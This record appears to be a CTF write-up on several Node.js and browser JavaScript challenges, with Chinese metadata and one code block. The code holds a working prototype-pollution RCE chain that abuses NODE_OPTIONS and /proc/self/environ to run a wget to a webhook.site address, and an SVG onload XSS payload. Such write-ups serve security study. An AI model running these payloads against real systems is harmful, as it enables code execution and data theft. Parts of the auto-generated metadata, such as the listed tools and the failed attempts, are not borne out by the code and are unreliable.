---
title: 几个Web+JS相关CTF题目小记 - Node原型链污染
contest: 多个CTF题目精选(JS+Web)
year: 2022
difficulty: medium
vuln_type: web_unknown
tags:
- Node.js
- 原型链污染
- prototype_pollution
- Proxy
- Fastify
- innerHTML
- SVG_onload
- unhandledrejection
- npm_preinstall
- prototype.shell
- prototype.path
- Object.prototype.data
attack_chain: Node JSON深合并Object.entries原型链污染(Object.prototype.data.path.shell) → npm preinstall脚本读取prototype.path触发RCE → Proxy get()拦截flag访问 → Fastify x-token=hash(user.id)未授权 → innerHTML+SVG onload执行JS → window.addEventListener('unhandledrejection',e.reason.stack)泄露path
key_payload: Object.prototype.data = {exports:{"./pwn.js"},name:'./usage.js'} + prototype.shell + prototype.path
one_liner: 5题Web+JS小记:Node原型链污染触发npm preinstall RCE/Proxy拦截/Fastify x-token/innerHTML SVG onload/unhandledrejection。
lesson: Node深合并Object.entries递归赋值是经典原型链污染漏洞;Object.prototype.data.path.shell可被npm preinstall利用;SVG onload可在innerHTML中执行JS;Proxy get()陷阱;window.addEventListener('unhandledrejection')泄露错误堆栈信息。
quality: medium
full_path: 幾個與_Web_跟_JS_相關的_CTF_題目小記.full.md
meta_path: 幾個與_Web_跟_JS_相關的_CTF_題目小記.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 几个Web+JS相关CTF题目小记 - Node原型链污染。5题Web+JS小记:Node原型链污染触发npm preinstall RCE/Proxy拦截/Fastify x-token/innerHTML SVG onload/unhandledrejection。。经验：Node深合并Object.entries递归赋值是经典原型链污染漏洞;Object.prototype.data....
category: web
subcategory: web_other
tools_used:
- pwntools
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/84742.html
reasoning_chain:
- 5 题 Web+JS 精选：Node 原型链污染 + Proxy + Fastify x-token + innerHTML SVG onload + unhandledrejection → 触发点：Node 原型链漏洞百变不离其宗
- Node JSON 深合并 Object.entries 递归赋值 → Object.prototype.data.path.shell 污染触发 npm preinstall RCE → 假设：npm preinstall 读 prototype.path 自动找可执行路径 → 动作：构造 pollution payload
- Proxy get() 拦截 flag 访问 → 假设：覆盖原始 get 拿引用原对象 → 动作：写 Proxy 替代访问
- Fastify x-token=hash(user.id) 未授权 → 假设：弱 hash 可爆破 → 动作：寻找 user.id=1 时 hash
- innerHTML + SVG onload 执行 JS → 假设：DOMPurify 漏 SVG → 动作：注入 <svg onload=alert>
- window.addEventListener('unhandledrejection', e.reason.stack) 泄露堆栈 → 假设：触发未捕获 promise rejection → 动作：fetch 失败路径触发
- 观察：5 题分别拿到
failed_attempts:
- 原型链污染直接 console.log 验证 → 失败：必须实际触发 npm preinstall
- Proxy 用 getOwnPropertyDescriptor → 失败：get 才是陷阱
- Fastify 用强 token 验证 → 失败：hash(user.id) 无盐弱爆破
- SVG 直接用 script → 失败：innerHTML 不解析 script 但解析 SVG
key_observations:
- Node 深合并 Object.entries 递归赋值是经典原型链污染漏洞
- Object.prototype.data.path.shell 可被 npm preinstall 利用，污染 prototype 是 npm install 阶段 RCE
- SVG onload 在 innerHTML 中执行 JS = XSS 过滤器的 SVG 死角
- Proxy get() 陷阱可被用于拦截敏感访问
- window.addEventListener('unhandledrejection') 泄露错误堆栈能直接拿到 node_modules 路径
prerequisites:
- Node.js 原型链与 Object.prototype
- npm preinstall / postinstall 钩子机制
- Proxy / Reflect 元编程
- Fastify / Express x-token JWT 弱校验
---
# 幾個與 Web 跟 JS 相關的 CTF 題目小記

> 原文: https://www.ctfiot.com/84742.html
> ID: 84742


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
 try{
 console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
 const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
 obj = JSON.parse(json);
 console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
 }catch (e) {
 require('./usage')
 }finally{
 process.exit();
 }
});

// index
module.exports=(O,o) => (
 Object.entries(O).forEach(
 ([K,V])=>Object.entries(V).forEach(
 ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
 )
 ), o
);
1
2
const { 1: name, 2: expansion = '' } =
 RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject;
1
const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
1
2
3
4
5
6
7
8
9
Object.prototype["data"] = {
 exports: {
 ".": "./pwn.js"
 },
 name: './usage.js'
}
Object.prototype["path"] = './'

require('./usage.js')
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
Object.prototype["data"] = {
 exports: {
 ".": "./preinstall.js"
 },
 name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
 "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//",
 "NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
1
2
3
var p = new Proxy({flag: window.flag || 'flag'}, {
 get: () => 'nope'
})
1
2
3
4
5
6
7
8
fastify.get("/api/notes/:
noteId", async (request, reply) => {
 const user = new User(request.session.userId);
 if (request.headers["x-token"] !== hash(user.id)) {
 throw new Error("Invalid token");
 }
 const noteId = validate(request.params.noteId);
 return user.sendNote(reply, noteId);
});
1
2
element.innerHTML = ''
console.log(2)
1
2
3
const div = document.createElement('div')
div.innerHTML = '<svg><svg onload=console.log(1)>'
console.log(2)
1
2
3
window.addEventListener('unhandledrejection', e => {
	console.log(e.reason.stack.match(/\/message\/(\w+)/)[1]);
});
```
